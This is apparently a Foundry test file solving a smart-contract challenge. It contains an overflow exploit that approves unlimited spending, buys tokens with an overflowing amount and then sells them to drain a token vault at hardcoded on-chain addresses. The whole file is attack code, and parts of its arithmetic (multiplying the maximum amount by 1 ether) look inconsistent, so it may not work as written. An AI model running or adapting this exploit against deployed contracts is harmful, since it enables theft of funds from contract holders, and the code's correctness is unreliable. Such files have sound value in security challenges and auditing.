// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.7.0;

import "forge-std/Test.sol"; // Use Test instead of Script for testing
import "../src/Token.sol";
import "../src/IERC20.sol";

contract ChallengeVTTest is Test {
    Token public vulnerableTokenContract;
    IERC20 public vaultToken;

    address public attacker;

    // Contract addresses (replace with actual addresses on-chain)
    address constant vulnerableContractAddress = 0x77af6cE52A2e3f84A43978609abd837fA522854D;
    address constant vaultTokenAddress = 0x4c84EBbcF4f4498345374304e58939544F7e73B9;

    function setUp() public {
        attacker = address(this); // Set the attacker to this contract's address

        // Initialize the vulnerable contract and vault token on-chain instances
        vulnerableTokenContract = Token(vulnerableContractAddress);
        vaultToken = IERC20(vaultTokenAddress);
    }

    function testOverflowExploit() public {
        // Start by funding the attacker account with some tokens if necessary
        // Assuming attacker already has vaultTokens for the exploit to work.

        // Approve the vulnerable contract to spend VaultTokens on behalf of the attacker
        vaultToken.approve(address(vulnerableTokenContract), type(uint256).max);

        // Step 1: Buy tokens with an overflow value
        uint256 tokensToBuy = type(uint256).max - vulnerableTokenContract.balanceOf(attacker) + 1; // Set up tokens to buy for overflow

        // Expecting this call to cause an overflow
        try vulnerableTokenContract.buy{value: tokensToBuy * 1 ether}(tokensToBuy) {
            // This block should execute if the transaction is successful
        } catch {
            // If overflow occurs and throws, we catch it and continue
        }

        // Step 2: Attempt to sell tokens to drain the vault
        // This should only be executed if we successfully overflowed
        uint256 sellTokens = 2; // Amount to sell, adjust based on your needs
        vulnerableTokenContract.sell(sellTokens);

        // Check if the contract has been drained (optional, for confirmation)
        require(vulnerableTokenContract.drained(), "Failed to drain the contract");
    }
}
